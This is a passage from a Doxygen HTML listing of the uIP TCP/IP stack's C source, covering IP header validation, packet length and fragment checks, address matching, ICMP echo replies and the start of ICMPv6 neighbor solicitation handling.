<a name="l00821"></a>00821       <span class="keywordflow">goto</span> drop;
<a name="l00822"></a>00822     }
<a name="l00823"></a>00823   }
<a name="l00824"></a>00824 <span class="preprocessor">#endif</span>
<a name="l00825"></a>00825 <span class="preprocessor"></span>
<a name="l00826"></a>00826   <span class="comment">/* This is where the input processing starts. */</span>
<a name="l00827"></a>00827   <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#7f7bb2145afba5df00c6e10ddefa8ae1">recv</a>);
<a name="l00828"></a>00828 
<a name="l00829"></a>00829   <span class="comment">/* Start of IP input header processing code. */</span>
<a name="l00830"></a>00830   
<a name="l00831"></a>00831 <span class="preprocessor">#if UIP_CONF_IPV6</span>
<a name="l00832"></a>00832 <span class="preprocessor"></span>  <span class="comment">/* Check validity of the IP header. */</span>
<a name="l00833"></a>00833   <span class="keywordflow">if</span>((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;vtc &amp; 0xf0) != 0x60)  { <span class="comment">/* IP version and header length. */</span>
<a name="l00834"></a>00834     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#5d8996950cdf3d8130cc3ad340eb9dff">drop</a>);
<a name="l00835"></a>00835     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#b93e351c3abba0c700b26b7b07e9527d">vhlerr</a>);
<a name="l00836"></a>00836     <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"ipv6: invalid version."</span>);
<a name="l00837"></a>00837     <span class="keywordflow">goto</span> drop;
<a name="l00838"></a>00838   }
<a name="l00839"></a>00839 <span class="preprocessor">#else </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l00840"></a>00840   <span class="comment">/* Check validity of the IP header. */</span>
<a name="l00841"></a>00841   <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;vhl != 0x45)  { <span class="comment">/* IP version and header length. */</span>
<a name="l00842"></a>00842     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#5d8996950cdf3d8130cc3ad340eb9dff">drop</a>);
<a name="l00843"></a>00843     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#b93e351c3abba0c700b26b7b07e9527d">vhlerr</a>);
<a name="l00844"></a>00844     <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"ip: invalid version or header length."</span>);
<a name="l00845"></a>00845     <span class="keywordflow">goto</span> drop;
<a name="l00846"></a>00846   }
<a name="l00847"></a>00847 <span class="preprocessor">#endif </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l00848"></a>00848   
<a name="l00849"></a>00849   <span class="comment">/* Check the size of the packet. If the size reported to us in</span>
<a name="l00850"></a>00850 <span class="comment">     uip_len is smaller the size reported in the IP header, we assume</span>
<a name="l00851"></a>00851 <span class="comment">     that the packet has been corrupted in transit. If the size of</span>
<a name="l00852"></a>00852 <span class="comment">     uip_len is larger than the size reported in the IP packet header,</span>
<a name="l00853"></a>00853 <span class="comment">     the packet has been padded and we set uip_len to the correct</span>
<a name="l00854"></a>00854 <span class="comment">     value.. */</span>
<a name="l00855"></a>00855 
<a name="l00856"></a>00856   <span class="keywordflow">if</span>((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[0] &lt;&lt; 8) + <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[1] &lt;= <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a>) {
<a name="l00857"></a>00857     <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> = (<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[0] &lt;&lt; 8) + <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[1];
<a name="l00858"></a>00858 #<span class="keywordflow">if</span> UIP_CONF_IPV6
<a name="l00859"></a>00859     <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> += 40; <span class="comment">/* The length reported in the IPv6 header is the</span>
<a name="l00860"></a>00860 <span class="comment">                      length of the payload that follows the</span>
<a name="l00861"></a>00861 <span class="comment">                      header. However, uIP uses the uip_len variable</span>
<a name="l00862"></a>00862 <span class="comment">                      for holding the size of the entire packet,</span>
<a name="l00863"></a>00863 <span class="comment">                      including the IP header. For IPv4 this is not a</span>
<a name="l00864"></a>00864 <span class="comment">                      problem as the length field in the IPv4 header</span>
<a name="l00865"></a>00865 <span class="comment">                      contains the length of the entire packet. But</span>
<a name="l00866"></a>00866 <span class="comment">                      for IPv6 we need to add the size of the IPv6</span>
<a name="l00867"></a>00867 <span class="comment">                      header (40 bytes). */</span>
<a name="l00868"></a>00868 #endif <span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l00869"></a>00869   } <span class="keywordflow">else</span> {
<a name="l00870"></a>00870     <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"ip: packet shorter than reported in IP header."</span>);
<a name="l00871"></a>00871     <span class="keywordflow">goto</span> drop;
<a name="l00872"></a>00872   }
<a name="l00873"></a>00873 
<a name="l00874"></a>00874 <span class="preprocessor">#if !UIP_CONF_IPV6</span>
<a name="l00875"></a>00875 <span class="preprocessor"></span>  <span class="comment">/* Check the fragment flag. */</span>
<a name="l00876"></a>00876   <span class="keywordflow">if</span>((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipoffset[0] &amp; 0x3f) != 0 ||
<a name="l00877"></a>00877      <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipoffset[1] != 0) {
<a name="l00878"></a>00878 <span class="preprocessor">#if UIP_REASSEMBLY</span>
<a name="l00879"></a>00879 <span class="preprocessor"></span>    <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> = uip_reass();
<a name="l00880"></a>00880     <span class="keywordflow">if</span>(<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> == 0) {
<a name="l00881"></a>00881       <span class="keywordflow">goto</span> drop;
<a name="l00882"></a>00882     }
<a name="l00883"></a>00883 <span class="preprocessor">#else </span><span class="comment">/* UIP_REASSEMBLY */</span>
<a name="l00884"></a>00884     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#5d8996950cdf3d8130cc3ad340eb9dff">drop</a>);
<a name="l00885"></a>00885     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#8082509468b2ac80ed7746aa1a5bc4f7">fragerr</a>);
<a name="l00886"></a>00886     <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"ip: fragment dropped."</span>);
<a name="l00887"></a>00887     <span class="keywordflow">goto</span> drop;
<a name="l00888"></a>00888 <span class="preprocessor">#endif </span><span class="comment">/* UIP_REASSEMBLY */</span>
<a name="l00889"></a>00889   }
<a name="l00890"></a>00890 <span class="preprocessor">#endif </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l00891"></a>00891 
<a name="l00892"></a>00892   <span class="keywordflow">if</span>(<a class="code" href="a00148.html#g210e629f7252e4bc8458cbdf260b3318">uip_ipaddr_cmp</a>(<a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a>, all_zeroes_addr)) {
<a name="l00893"></a>00893     <span class="comment">/* If we are configured to use ping IP address configuration and</span>
<a name="l00894"></a>00894 <span class="comment">       hasn't been assigned an IP address yet, we accept all ICMP</span>
<a name="l00895"></a>00895 <span class="comment">       packets. */</span>
<a name="l00896"></a>00896 <span class="preprocessor">#if UIP_PINGADDRCONF &amp;&amp; !UIP_CONF_IPV6</span>
<a name="l00897"></a>00897 <span class="preprocessor"></span>    <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;proto == <a class="code" href="a00150.html#g359951eecd80541c2101f628a9da9146">UIP_PROTO_ICMP</a>) {
<a name="l00898"></a>00898       <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"ip: possible ping config packet received."</span>);
<a name="l00899"></a>00899       <span class="keywordflow">goto</span> icmp_input;
<a name="l00900"></a>00900     } <span class="keywordflow">else</span> {
<a name="l00901"></a>00901       <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"ip: packet dropped since no address assigned."</span>);
<a name="l00902"></a>00902       <span class="keywordflow">goto</span> drop;
<a name="l00903"></a>00903     }
<a name="l00904"></a>00904 <span class="preprocessor">#endif </span><span class="comment">/* UIP_PINGADDRCONF */</span>
<a name="l00905"></a>00905 
<a name="l00906"></a>00906   } <span class="keywordflow">else</span> {
<a name="l00907"></a>00907     <span class="comment">/* If IP broadcast support is configured, we check for a broadcast</span>
<a name="l00908"></a>00908 <span class="comment">       UDP packet, which may be destined to us. */</span>
<a name="l00909"></a>00909 <span class="preprocessor">#if UIP_BROADCAST</span>
<a name="l00910"></a>00910 <span class="preprocessor"></span>    <a class="code" href="a00135.html#534d9e416324fb8ecca6b9cb4b1f6a6a">DEBUG_PRINTF</a>(<span class="stringliteral">"UDP IP checksum 0x%04x\n"</span>, <a class="code" href="a00150.html#g2addf34c7d457c1a7899a7e2171ef1e9">uip_ipchksum</a>());
<a name="l00911"></a>00911     <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;proto == <a class="code" href="a00150.html#gf72d7b9a737707dcfb2c41fec2b6792e">UIP_PROTO_UDP</a> &amp;&amp;
<a name="l00912"></a>00912        <a class="code" href="a00148.html#g210e629f7252e4bc8458cbdf260b3318">uip_ipaddr_cmp</a>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destipaddr, all_ones_addr)
<a name="l00913"></a>00913        <span class="comment">/*&amp;&amp;</span>
<a name="l00914"></a>00914 <span class="comment">         uip_ipchksum() == 0xffff*/</span>) {
<a name="l00915"></a>00915       <span class="keywordflow">goto</span> udp_input;
<a name="l00916"></a>00916     }
<a name="l00917"></a>00917 <span class="preprocessor">#endif </span><span class="comment">/* UIP_BROADCAST */</span>
<a name="l00918"></a>00918     
<a name="l00919"></a>00919     <span class="comment">/* Check if the packet is destined for our IP address. */</span>
<a name="l00920"></a>00920 <span class="preprocessor">#if !UIP_CONF_IPV6</span>
<a name="l00921"></a>00921 <span class="preprocessor"></span>    <span class="keywordflow">if</span>(!<a class="code" href="a00148.html#g210e629f7252e4bc8458cbdf260b3318">uip_ipaddr_cmp</a>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destipaddr, <a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a>)) {
<a name="l00922"></a>00922       <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#5d8996950cdf3d8130cc3ad340eb9dff">drop</a>);
<a name="l00923"></a>00923       <span class="keywordflow">goto</span> drop;
<a name="l00924"></a>00924     }
<a name="l00925"></a>00925 <span class="preprocessor">#else </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l00926"></a>00926     <span class="comment">/* For IPv6, packet reception is a little trickier as we need to</span>
<a name="l00927"></a>00927 <span class="comment">       make sure that we listen to certain multicast addresses (all</span>
<a name="l00928"></a>00928 <span class="comment">       hosts multicast address, and the solicited-node multicast</span>
<a name="l00929"></a>00929 <span class="comment">       address) as well. However, we will cheat here and accept all</span>
<a name="l00930"></a>00930 <span class="comment">       multicast packets that are sent to the ff02::/16 addresses. */</span>
<a name="l00931"></a>00931     <span class="keywordflow">if</span>(!<a class="code" href="a00148.html#g210e629f7252e4bc8458cbdf260b3318">uip_ipaddr_cmp</a>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destipaddr, <a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a>) &amp;&amp;
<a name="l00932"></a>00932        <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destipaddr[0] != <a class="code" href="a00148.html#g69a7a4951ff21b302267532c21ee78fc">HTONS</a>(0xff02)) {
<a name="l00933"></a>00933       <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#5d8996950cdf3d8130cc3ad340eb9dff">drop</a>);
<a name="l00934"></a>00934       <span class="keywordflow">goto</span> drop;
<a name="l00935"></a>00935     }
<a name="l00936"></a>00936 <span class="preprocessor">#endif </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l00937"></a>00937   }
<a name="l00938"></a>00938 
<a name="l00939"></a>00939 <span class="preprocessor">#if !UIP_CONF_IPV6</span>
<a name="l00940"></a>00940 <span class="preprocessor"></span>  <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g2addf34c7d457c1a7899a7e2171ef1e9">uip_ipchksum</a>() != 0xffff) { <span class="comment">/* Compute and check the IP header</span>
<a name="l00941"></a>00941 <span class="comment">                                    checksum. */</span>
<a name="l00942"></a>00942     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#5d8996950cdf3d8130cc3ad340eb9dff">drop</a>);
<a name="l00943"></a>00943     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#7675e6b9adbddbd545d3aac8ca092fbb">chkerr</a>);
<a name="l00944"></a>00944     <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"ip: bad checksum."</span>);
<a name="l00945"></a>00945     <span class="keywordflow">goto</span> drop;
<a name="l00946"></a>00946   }
<a name="l00947"></a>00947 <span class="preprocessor">#endif </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l00948"></a>00948 
<a name="l00949"></a>00949   <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;proto == <a class="code" href="a00150.html#g517c770991459cc62dc009c0d3875c6a">UIP_PROTO_TCP</a>) { <span class="comment">/* Check for TCP packet. If so,</span>
<a name="l00950"></a>00950 <span class="comment">                                       proceed with TCP input</span>
<a name="l00951"></a>00951 <span class="comment">                                       processing. */</span>
<a name="l00952"></a>00952     <span class="keywordflow">goto</span> tcp_input;
<a name="l00953"></a>00953   }
<a name="l00954"></a>00954 
<a name="l00955"></a>00955 <span class="preprocessor">#if UIP_UDP</span>
<a name="l00956"></a>00956 <span class="preprocessor"></span>  <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;proto == <a class="code" href="a00150.html#gf72d7b9a737707dcfb2c41fec2b6792e">UIP_PROTO_UDP</a>) {
<a name="l00957"></a>00957     <span class="keywordflow">goto</span> udp_input;
<a name="l00958"></a>00958   }
<a name="l00959"></a>00959 <span class="preprocessor">#endif </span><span class="comment">/* UIP_UDP */</span>
<a name="l00960"></a>00960 
<a name="l00961"></a>00961 <span class="preprocessor">#if !UIP_CONF_IPV6</span>
<a name="l00962"></a>00962 <span class="preprocessor"></span>  <span class="comment">/* ICMPv4 processing code follows. */</span>
<a name="l00963"></a>00963   <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;proto != <a class="code" href="a00150.html#g359951eecd80541c2101f628a9da9146">UIP_PROTO_ICMP</a>) { <span class="comment">/* We only allow ICMP packets from</span>
<a name="l00964"></a>00964 <span class="comment">                                        here. */</span>
<a name="l00965"></a>00965     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#5d8996950cdf3d8130cc3ad340eb9dff">drop</a>);
<a name="l00966"></a>00966     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#b4622e2599ff3a592db09219b2641682">protoerr</a>);
<a name="l00967"></a>00967     <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"ip: neither tcp nor icmp."</span>);
<a name="l00968"></a>00968     <span class="keywordflow">goto</span> drop;
<a name="l00969"></a>00969   }
<a name="l00970"></a>00970 
<a name="l00971"></a>00971 <span class="preprocessor">#if UIP_PINGADDRCONF</span>
<a name="l00972"></a>00972 <span class="preprocessor"></span> icmp_input:
<a name="l00973"></a>00973 <span class="preprocessor">#endif </span><span class="comment">/* UIP_PINGADDRCONF */</span>
<a name="l00974"></a>00974   <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#3983b45977630418d3038231aa8b68ed">icmp</a>.<a class="code" href="a00093.html#7f7bb2145afba5df00c6e10ddefa8ae1">recv</a>);
<a name="l00975"></a>00975 
<a name="l00976"></a>00976   <span class="comment">/* ICMP echo (i.e., ping) processing. This is simple, we only change</span>
<a name="l00977"></a>00977 <span class="comment">     the ICMP type from ECHO to ECHO_REPLY and adjust the ICMP</span>
<a name="l00978"></a>00978 <span class="comment">     checksum before we return the packet. */</span>
<a name="l00979"></a>00979   <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;type != <a class="code" href="a00150.html#gd58231410d58e34b455328b888a9e73c">ICMP_ECHO</a>) {
<a name="l00980"></a>00980     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#3983b45977630418d3038231aa8b68ed">icmp</a>.<a class="code" href="a00093.html#5d8996950cdf3d8130cc3ad340eb9dff">drop</a>);
<a name="l00981"></a>00981     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#3983b45977630418d3038231aa8b68ed">icmp</a>.<a class="code" href="a00093.html#8da121d6e50992ec55778f9b2141552d">typeerr</a>);
<a name="l00982"></a>00982     <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"icmp: not icmp echo."</span>);
<a name="l00983"></a>00983     <span class="keywordflow">goto</span> drop;
<a name="l00984"></a>00984   }
<a name="l00985"></a>00985 
<a name="l00986"></a>00986   <span class="comment">/* If we are configured to use ping IP address assignment, we use</span>
<a name="l00987"></a>00987 <span class="comment">     the destination IP address of this ping packet and assign it to</span>
<a name="l00988"></a>00988 <span class="comment">     ourself. */</span>
<a name="l00989"></a>00989 <span class="preprocessor">#if UIP_PINGADDRCONF</span>
<a name="l00990"></a>00990 <span class="preprocessor"></span>  <span class="keywordflow">if</span>((<a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a>[0] | <a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a>[1]) == 0) {
<a name="l00991"></a>00991     <a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a>[0] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destipaddr[0];
<a name="l00992"></a>00992     <a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a>[1] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destipaddr[1];
<a name="l00993"></a>00993   }
<a name="l00994"></a>00994 <span class="preprocessor">#endif </span><span class="comment">/* UIP_PINGADDRCONF */</span>
<a name="l00995"></a>00995 
<a name="l00996"></a>00996   <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;type = <a class="code" href="a00150.html#g5c5b1834e497f53ad0ef947bbe9777fa">ICMP_ECHO_REPLY</a>;
<a name="l00997"></a>00997 
<a name="l00998"></a>00998   <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;icmpchksum &gt;= <a class="code" href="a00148.html#g69a7a4951ff21b302267532c21ee78fc">HTONS</a>(0xffff - (<a class="code" href="a00150.html#gd58231410d58e34b455328b888a9e73c">ICMP_ECHO</a> &lt;&lt; 8))) {
<a name="l00999"></a>00999     <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;icmpchksum += <a class="code" href="a00148.html#g69a7a4951ff21b302267532c21ee78fc">HTONS</a>(<a class="code" href="a00150.html#gd58231410d58e34b455328b888a9e73c">ICMP_ECHO</a> &lt;&lt; 8) + 1;
<a name="l01000"></a>01000   } <span class="keywordflow">else</span> {
<a name="l01001"></a>01001     <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;icmpchksum += <a class="code" href="a00148.html#g69a7a4951ff21b302267532c21ee78fc">HTONS</a>(<a class="code" href="a00150.html#gd58231410d58e34b455328b888a9e73c">ICMP_ECHO</a> &lt;&lt; 8);
<a name="l01002"></a>01002   }
<a name="l01003"></a>01003 
<a name="l01004"></a>01004   <span class="comment">/* Swap IP addresses. */</span>
<a name="l01005"></a>01005   <a class="code" href="a00148.html#g769512993b7b27271909d6daa4748b60">uip_ipaddr_copy</a>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destipaddr, <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcipaddr);
<a name="l01006"></a>01006   <a class="code" href="a00148.html#g769512993b7b27271909d6daa4748b60">uip_ipaddr_copy</a>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcipaddr, <a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a>);
<a name="l01007"></a>01007 
<a name="l01008"></a>01008   <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#3983b45977630418d3038231aa8b68ed">icmp</a>.<a class="code" href="a00093.html#dc69abadd5aa07c7d74f9292db2cd93c">sent</a>);
<a name="l01009"></a>01009   <span class="keywordflow">goto</span> send;
<a name="l01010"></a>01010 
<a name="l01011"></a>01011   <span class="comment">/* End of IPv4 input header processing code. */</span>
<a name="l01012"></a>01012 <span class="preprocessor">#else </span><span class="comment">/* !UIP_CONF_IPV6 */</span>
<a name="l01013"></a>01013 
<a name="l01014"></a>01014   <span class="comment">/* This is IPv6 ICMPv6 processing code. */</span>
<a name="l01015"></a>01015   <a class="code" href="a00135.html#534d9e416324fb8ecca6b9cb4b1f6a6a">DEBUG_PRINTF</a>(<span class="stringliteral">"icmp6_input: length %d\n"</span>, <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a>);
<a name="l01016"></a>01016 
<a name="l01017"></a>01017   <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;proto != <a class="code" href="a00150.html#gad0321f4c570f9983c6de81ece3ddc20">UIP_PROTO_ICMP6</a>) { <span class="comment">/* We only allow ICMPv6 packets from</span>
<a name="l01018"></a>01018 <span class="comment">                                         here. */</span>
<a name="l01019"></a>01019     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#5d8996950cdf3d8130cc3ad340eb9dff">drop</a>);
<a name="l01020"></a>01020     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#b4622e2599ff3a592db09219b2641682">protoerr</a>);
<a name="l01021"></a>01021     <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"ip: neither tcp nor icmp6."</span>);
<a name="l01022"></a>01022     <span class="keywordflow">goto</span> drop;
<a name="l01023"></a>01023   }
<a name="l01024"></a>01024 
<a name="l01025"></a>01025   <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#3983b45977630418d3038231aa8b68ed">icmp</a>.<a class="code" href="a00093.html#7f7bb2145afba5df00c6e10ddefa8ae1">recv</a>);
<a name="l01026"></a>01026 
<a name="l01027"></a>01027   <span class="comment">/* If we get a neighbor solicitation for our address we should send</span>
<a name="l01028"></a>01028 <span class="comment">     a neighbor advertisement message back. */</span>
<a name="l01029"></a>01029   <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;type == <a class="code" href="a00150.html#g1cea57e3ea526f210b1068e6dcf7b4f4">ICMP6_NEIGHBOR_SOLICITATION</a>) {
<a name="l01030"></a>01030     <span class="keywordflow">if</span>(<a class="code" href="a00148.html#g210e629f7252e4bc8458cbdf260b3318">uip_ipaddr_cmp</a>(<a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;icmp6data, <a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a>)) {
<a name="l01031"></a>01031 
<a name="l01032"></a>01032       <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;options[0] == <a class="code" href="a00150.html#g42288d5c3cf4b10becefec657f441e54">ICMP6_OPTION_SOURCE_LINK_ADDRESS</a>) {
<a name="l01033"></a>01033         <span class="comment">/* Save the sender's address in our neighbor list. */</span>
